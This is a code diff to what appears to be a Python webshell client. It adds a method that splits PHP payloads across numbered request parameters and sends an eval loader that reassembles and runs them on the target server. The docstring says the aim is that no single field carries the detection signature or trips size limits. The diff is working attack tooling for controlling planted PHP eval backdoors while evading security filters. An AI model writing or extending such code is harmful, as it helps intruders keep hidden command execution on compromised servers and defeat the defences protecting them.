@@ -69,13 +69,33 @@ class Transport:
                 raise ConnectionFailed(str(exc)) from exc
         raise ConnectionFailed("exhausted retries")  # pragma: no cover
 
+    def _multipart_fields(self, php_code: str) -> dict[str, str]:
+        """Split ``php_code`` across N params with a tiny re-assembling loader.
+
+        The bulk of the payload (the base64 blob, the ``base64_decode`` token,
+        etc.) ends up spread over ``p0..pn-1`` and is concatenated + ``eval``'d
+        server-side, so no single parameter carries the whole signature and no
+        one field hits a per-parameter size limit. PHP eval shells only.
+        """
+        n = self.config.split
+        size = max(1, -(-len(php_code) // n))  # ceil division
+        chunks = [php_code[i : i + size] for i in range(0, len(php_code), size)] or [""]
+        names = [f"p{i}" for i in range(len(chunks))]
+        superglobal = "$_GET" if self.method in ("GET", "REQUEST") else "$_POST"
+        loader = "eval(" + ".".join(f"{superglobal}['{name}']" for name in names) + ");"
+        fields = {self.password: loader}
+        fields.update(dict(zip(names, chunks, strict=True)))
+        return fields
+
     def send(self, php_code: str) -> str:
         """POST/GET ``php_code`` to the password parameter and return the body."""
         log.debug(f"send {self.method} {self.url} <= {php_code}")
+        multipart = self.config.split > 1 and self.config.lang == "php"
+        fields = self._multipart_fields(php_code) if multipart else {self.password: php_code}
         if self.method == "POST":
-            body = self._request("POST", data={self.password: php_code}).text
+            body = self._request("POST", data=fields).text
         elif self.method in ("GET", "REQUEST"):
-            body = self._request("GET", params={self.password: php_code}).text
+            body = self._request("GET", params=fields).text
         else:
             raise ConnectionFailed(f"Unsupported method: {self.method}")
         log.debug(f"recv {len(body)}B => {body!r}")
